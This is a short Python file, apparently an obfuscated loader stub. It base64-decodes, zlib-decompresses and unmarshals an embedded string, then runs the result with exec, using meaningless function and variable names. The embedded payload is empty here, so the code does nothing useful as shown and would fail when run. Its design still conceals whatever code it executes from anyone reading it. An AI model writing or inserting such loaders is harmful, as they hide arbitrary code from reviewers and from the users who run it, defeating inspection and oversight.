import base64, zlib, marshal, types

def cpavynac():
    """Decrypt and execute code"""
    gtxtwc = ""
    kblljg = base64.b64decode(gtxtwc)
    nujgnn = zlib.decompress(kblljg)
    return marshal.loads(nujgnn)

# Execute encrypted code
exec(cpavynac())
